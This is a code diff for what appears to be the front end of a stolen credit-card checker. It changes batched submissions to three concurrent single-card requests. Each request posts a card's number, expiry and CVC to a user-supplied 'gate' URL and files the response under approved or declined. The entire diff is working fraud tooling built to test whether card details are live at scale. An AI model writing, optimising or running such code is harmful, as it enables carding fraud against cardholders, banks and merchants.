@@ -349,8 +349,7 @@
         $(document).ready(function() {
             let isProcessing = false;
             let activeRequests = 0;
-            const MAX_CONCURRENT = 1; // One batch at a time to ensure 3 cards in parallel
-            const BATCH_SIZE = 3; // Up to 3 cards per batch
+            const MAX_CONCURRENT = 3; // 3 concurrent POST requests
             let abortControllers = [];
             let totalCards = 0;
 
@@ -419,20 +418,18 @@
                 });
             });
 
-            // Process a batch of up to 3 cards
-            async function processBatch(batchCards, controller) {
+            // Process a single card
+            async function processCard(card, controller) {
                 return new Promise((resolve) => {
                     const formData = new FormData();
-                    batchCards.forEach((card, index) => {
-                        let normalizedYear = card.exp_year;
-                        if (normalizedYear.length === 2) {
-                            normalizedYear = (parseInt(normalizedYear) < 50 ? '20' : '19') + normalizedYear;
-                        }
-                        formData.append(`cards[${index}][number]`, card.number);
-                        formData.append(`cards[${index}][exp_month]`, card.exp_month);
-                        formData.append(`cards[${index}][exp_year]`, normalizedYear);
-                        formData.append(`cards[${index}][cvc]`, card.cvc);
-                    });
+                    let normalizedYear = card.exp_year;
+                    if (normalizedYear.length === 2) {
+                        normalizedYear = (parseInt(normalizedYear) < 50 ? '20' : '19') + normalizedYear;
+                    }
+                    formData.append('card[number]', card.number);
+                    formData.append('card[exp_month]', card.exp_month);
+                    formData.append('card[exp_year]', normalizedYear);
+                    formData.append('card[cvc]', card.cvc);
 
                     $.ajax({
                         url: $('#gate').val(),
@@ -440,35 +437,33 @@
                         data: formData,
                         processData: false,
                         contentType: false,
-                        timeout: 15000,
+                        timeout: 12000, // Slightly longer than backend timeout
                         signal: controller.signal,
                         success: function(response) {
-                            const results = response.trim().split('\n').filter(line => line.trim()).map((line, i) => ({
-                                success: line.includes('APPROVED'),
-                                response: line,
-                                card: batchCards[i] || { number: 'Unknown', exp_month: '', exp_year: '', cvc: '' },
-                                displayCard: batchCards[i] ? `${batchCards[i].number}|${batchCards[i].exp_month}|${batchCards[i].exp_year}|${batchCards[i].cvc}` : 'Unknown'
-                            }));
-                            resolve(results);
+                            resolve({
+                                success: response.includes('APPROVED'),
+                                response: response.trim(),
+                                card: card,
+                                displayCard: `${card.number}|${card.exp_month}|${card.exp_year}|${card.cvc}`
+                            });
                         },
                         error: function(xhr) {
                             if (xhr.statusText === 'abort') {
                                 resolve(null);
                             } else {
-                                const results = batchCards.map(card => ({
+                                resolve({
                                     success: false,
                                     response: `DECLINED [${xhr.responseText || 'Request failed'}] ${card.number}|${card.exp_month}|${card.exp_year}|${card.cvc}`,
                                     card: card,
                                     displayCard: `${card.number}|${card.exp_month}|${card.exp_year}|${card.cvc}`
-                                }));
-                                resolve(results);
+                                });
                             }
                         }
                     });
                 });
             }
 
-            // Main processing function
+            // Main processing function with 3 concurrent requests
             async function processCards() {
                 if (isProcessing) return;
 
@@ -506,32 +501,22 @@
 
                 const results = [];
                 let completed = 0;
+                const cardQueue = [...validCards];
 
-                // Split cards into batches of up to BATCH_SIZE
-                const batches = [];
-                for (let i = 0; i < validCards.length; i += BATCH_SIZE) {
-                    batches.push(validCards.slice(i, i + BATCH_SIZE));
-                }
+                while (cardQueue.length > 0 && isProcessing) {
+                    while (activeRequests < MAX_CONCURRENT && cardQueue.length > 0 && isProcessing) {
+                        const card = cardQueue.shift();
+                        activeRequests++;
+                        const controller = new AbortController();
+                        abortControllers.push(controller);
 
-                for (let i = 0; i < batches.length && isProcessing; i++) {
-                    while (activeRequests >= MAX_CONCURRENT && isProcessing) {
-                        await new Promise(resolve => setTimeout(resolve, 20)); // Minimal delay
-                    }
+                        processCard(card, controller).then(result => {
+                            if (result === null) return;
 
-                    if (!isProcessing) break;
+                            results.push(result);
+                            completed++;
+                            activeRequests--;
 
-                    activeRequests++;
-                    const controller = new AbortController();
-                    abortControllers.push(controller);
-
-                    processBatch(batches[i], controller).then(batchResults => {
-                        if (batchResults === null) return;
-
-                        results.push(...batchResults);
-                        completed += batchResults.length;
-                        activeRequests--;
-
-                        batchResults.forEach(result => {
                             if (result.response.includes('APPROVED')) {
                                 $('#lista_approved').append(`<span style="color: green; font-family: 'Inter', sans-serif;">${result.response}</span><br>`);
                                 $('.approved').text(parseInt($('.approved').text()) + 1);
@@ -539,14 +524,17 @@
                                 $('#lista_declined').append(`<span style="color: red; font-family: 'Inter', sans-serif;">${result.response}</span><br>`);
                                 $('.reprovadas').text(parseInt($('.reprovadas').text()) + 1);
                             }
+
+                            $('.checked').text(`${completed} / ${totalCards}`);
+
+                            if (completed >= totalCards || !isProcessing) {
+                                finishProcessing();
+                            }
                         });
-
-                        $('.checked').text(`${completed} / ${totalCards}`);
-
-                        if (completed >= totalCards || !isProcessing) {
-                            finishProcessing();
-                        }
-                    });
+                    }
+                    if (isProcessing) {
+                        await new Promise(resolve => setTimeout(resolve, 10)); // Minimal delay
+                    }
                 }
             }
 
